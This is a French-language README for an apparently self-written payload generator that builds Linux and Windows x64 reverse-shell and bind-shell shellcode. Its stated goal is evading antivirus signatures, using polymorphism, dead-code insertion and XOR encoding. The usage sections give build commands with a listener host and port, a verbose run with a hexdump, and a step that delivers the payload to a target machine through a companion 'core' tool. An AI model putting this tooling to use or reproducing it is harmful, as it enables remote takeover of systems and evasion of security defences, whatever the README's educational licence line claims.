# Packet Forger Payloads

## 🎯 Objectif

Générer des payloads binaires exécutables, optimisés pour être transportés par le core, **sans dépendance inverse**.

## ✨ Caractéristiques

### Génération Native
- **Shellcode Linux x64** : Génération complète via NASM
- **Shellcode Windows x64** : Résolution dynamique des API (PEB walk, GetProcAddress)
- **Plus besoin de msfvenom** : Génération 100% native

### Polymorphisme Anti-Signature
- **Génération unique** : Chaque shellcode est différent
- **NOP sleds variés** : 8 variantes différentes
- **Instructions équivalentes** : Remplacement par équivalents
- **Dead code insertion** : Code mort aléatoire

### Techniques Avancées
- **Résolution dynamique d'API Windows** : PEB walk, GetProcAddress, LoadLibraryA
- **Encodage XOR** : Obfuscation avec clé aléatoire
- **Bind shell** : Alternative au reverse shell
- **Pipeline NASM-only** : Tout passe par l'assembleur

## 🚀 Utilisation

### Installation

```bash
cd packet-forger-payloads
make
sudo make install
```

### Génération Basique

```bash
# Reverse shell Windows
./payload-builder build windows reverse \
    --lhost 192.168.10.20 \
    --lport 4444 \
    --output payload.bin

# Reverse shell Linux polymorphe
./payload-builder build linux reverse \
    --lhost 192.168.10.20 \
    --lport 4444 \
    --polymorphic \
    --output payload.bin

# Bind shell Linux
./payload-builder build linux bind \
    --lport 4444 \
    --output payload.bin
```

### Options

```
build <platform> <type>     Générer un payload
  platform: linux, windows
  type: reverse, bind

--lhost <ip>                IP du listener (reverse shell)
--lport <port>              Port du listener
--polymorphic               Génération polymorphe
--encode-xor                Encodage XOR
--output <file>             Fichier de sortie
--verbose, -V               Mode verbeux (hexdump, détails de génération)
```

### Mode Verbose

Avec `--verbose` ou `-V`, vous obtenez des détails complets sur la génération :

- **Paramètres de génération** : Plateforme, type, listener, options activées
- **Étapes de génération** : Détails du processus (Linux/Windows, polymorphe, ASM)
- **Détails du payload généré** :
  - Taille totale
  - Magic bytes (4 premiers bytes)
  - Statistiques (bytes null, caractères imprimables)
  - **Hexdump complet** du payload (format hex + ASCII)
- **Après encodage XOR** : Hexdump du payload encodé si `--encode-xor` est utilisé

**Exemple** :
```bash
./payload-builder build windows reverse --lhost 192.168.10.20 --lport 4444 --verbose
```

**Sortie verbose** :
```
[~] Paramètres de génération :
[~]   - Plateforme : windows
[~]   - Type : reverse
[~]   - Listener IP : 192.168.10.20
[~]   - Listener Port : 4444
[~] Démarrage de la génération...
[~] Génération shellcode Windows x64 (résolution dynamique API)...
[~] Génération terminée : 824 bytes générés

[~] ===== Détails du Payload =====
[~] Taille totale : 824 bytes
[~] Plateforme : windows
[~] Type : reverse
[~] Magic bytes (4 premiers): 0x48 0x31 0xc0 0x48
[~] Statistiques :
[~]   - Bytes null : 0 (0.0%)
[~]   - Caractères imprimables : 45 (5.5%)

[~] Payload complet (824 bytes):
[~] 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f
[~] ------------------------------------------------
[~] 0000: 48 31 c0 48 89 c2 48 89 c6 48 89 e7 48 83 ... |H1.H..H..H..H.|
[~] 0010: ec 20 48 8d 3d 0a 00 00 00 48 31 c0 b0 02 ... |. H.=....H1...|
...
```

## 📦 Format de Sortie

### Fichier Binaire (.bin)

Format raw binary, prêt à être transporté par le core.

### Metadata JSON (.json)

```json
{
    "platform": "windows",
    "type": "reverse_shell",
    "size": 512,
    "polymorphic": true,
    "encoded": false,
    "lhost": "192.168.10.20",
    "lport": 4444
}
```

## 🔗 Intégration avec le Core

```bash
# 1. Générer le payload
./payload-builder build windows reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --polymorphic --output ../payload.bin

# 2. Transporter via le core
cd ../packet-forger-core
sudo ./packet-forger-core --payload ../payload.bin \
    --target 192.168.10.5 --port 80
```

**Relation** : `payloads ──▶ core` (unidirectionnelle)

## 📚 Documentation

- **[WINDOWS_SHELLCODE.md](../docs/WINDOWS_SHELLCODE.md)** : Génération Windows avec résolution dynamique
- **[POLYMORPHIC_SHELLCODE.md](../docs/POLYMORPHIC_SHELLCODE.md)** : Techniques de polymorphisme
- **[ARCHITECTURE.md](../docs/ARCHITECTURE.md)** : Architecture modulaire

## 🛠️ Développement

### Structure

```
packet-forger-payloads/
├── src/
│   ├── shellcode_generator.c         # Génération Linux/Windows
│   ├── asm_generator.c                # Pipeline NASM
│   ├── polymorphic_shellcode.c        # Polymorphisme
│   ├── windows_shellcode_generator.c  # Résolution dynamique API
│   ├── bind_shell.c                    # Bind shell
│   └── shellcode_encoder.c            # Encodage XOR
├── cli/
│   └── payload_builder.c              # CLI indépendante
└── include/
    └── payload_generator.h
```

### Compilation

```bash
make                    # Compiler
make test              # Tests de génération
make clean             # Nettoyer
```

## ⚠️ Limitations

1. **NASM requis** : Nécessite NASM pour l'assemblage
2. **Windows uniquement** : Shellcode Windows ne fonctionne que sur Windows x64
3. **Taille** : Le shellcode Windows est plus grand (~600-800 bytes)

## 📝 Licence

Ce projet est fourni à des fins éducatives.

